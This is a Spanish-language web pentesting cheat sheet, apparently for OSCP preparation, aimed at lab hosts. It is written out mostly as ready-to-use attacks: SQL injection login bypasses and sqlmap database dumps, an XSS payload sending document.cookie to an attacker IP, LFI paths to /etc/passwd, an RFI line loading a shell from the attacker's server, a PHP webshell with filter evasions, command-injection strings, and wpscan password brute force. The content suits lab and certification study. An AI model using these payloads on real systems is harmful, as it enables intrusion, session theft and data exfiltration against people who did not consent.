2. Herramientas base y descubrimiento de contenido (fuzzing)

$ whatweb http://10.0.2.4         # tecnologías
$ nikto -h http://10.0.2.4        # vulns conocidas, ficheros peligrosos
# Descubrir rutas/ficheros ocultos (directory busting):
$ gobuster dir -u http://10.0.2.4 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
$ ffuf -u http://10.0.2.4/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
# Subdominios virtuales (vhosts):
$ ffuf -u http://10.0.2.4 -H "Host: FUZZ.empresa.com" -w sub.txt -fs 1234
💡 Siempre mira primerorobots.txt, el código fuente (Ctrl+U), comentarios HTML, y /admin, /login, /backup, /.git. Muchas entradas están a la vista.
📘 Burp SuiteProxy que se pone entre tu navegador y la web para ver y modificar cada petición. Imprescindible. Pestañas clave: Proxy (interceptar), Repeater (reenviar y tocar peticiones), Intruder (fuzzing).

3. SQL Injection (SQLi)

📘 ¿Qué es?La web mete lo que escribes directamente en una consulta a la base de datos. Si inyectas SQL, puedes saltarte logins o leer toda la base de datos.
# Payloads típicos para bypass de login:
' OR '1'='1' --
' OR 1=1 #
admin' --
# Detectar: mete una comilla ' y mira si da error SQL
# Automatizar con sqlmap:
$ sqlmap -u "http://10.0.2.4/item.php?id=1" --batch --dbs
$ sqlmap -u "http://10.0.2.4/item.php?id=1" -D tienda -T users --dump
⚠️ Tipos de SQLiIn-band/UNION (ves el resultado en la página), Blind booleana (la página cambia sí/no), Blind por tiempo (usas SLEEP(5) y mides). sqlmap las maneja todas.

4. XSS (Cross-Site Scripting)

📘 ¿Qué es?Inyectas JavaScript que se ejecuta en el navegador de otros usuarios. Sirve para robar cookies de sesión.
# Prueba básica (reflejado):
<script>alert(1)</script>
# Robo de cookie (stored):
<script>fetch('http://10.0.2.15/c='+document.cookie)</script>

Tipos: Reflejado (en la URL), Almacenado (guardado en la web, afecta a todos), DOM (en el JavaScript del cliente).

5. LFI / RFI (inclusión de ficheros)

📘 ¿Qué es?La web incluye un fichero según un parámetro (?page=inicio). Si no filtra, puedes leer ficheros del sistema (LFI) o cargar uno tuyo remoto (RFI).
# LFI: leer /etc/passwd subiendo directorios
http://10.0.2.4/index.php?page=../../../../etc/passwd
# Con filtro PHP para leer código fuente en base64
?page=php://filter/convert.base64-encode/resource=config
# RFI: cargar una shell desde TU servidor
?page=http://10.0.2.15/shell.txt
💡 De LFI a shell (log poisoning)Si puedes leer /var/log/apache2/access.log por LFI y controlas el User-Agent, metes código PHP en el User-Agent y luego lo ejecutas incluyendo el log.

6. Subida de ficheros → webshell

# shell.php
<?php system($_GET['cmd']); ?>
# Si la subes y la web la ejecuta:
http://10.0.2.4/uploads/shell.php?cmd=id
# Evadir filtros: shell.php.jpg, shell.phtml, cambiar Content-Type, magic bytes

7. Inyección de comandos

📘 ¿Qué es?La web pasa tu entrada a un comando del sistema (p. ej. un ping). Encadenas tus propios comandos.
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1`id`

8. WordPress y CMS

$ wpscan --url http://10.0.2.4 --enumerate u,vp     # usuarios y plugins vulnerables
$ wpscan --url http://10.0.2.4 -U admin -P rockyou.txt   # fuerza bruta login
🔴 Nivel OSCPEn el OSCP la web suele ser el acceso inicial. Domina SQLi manual (sin sqlmap, que está limitado), LFI→RCE, subida de ficheros y la explotación de CMS/software conocido (busca el nombre + versión + “exploit”/“github”). Convierte siempre la webshell en una reverse shell estable (módulo 09).
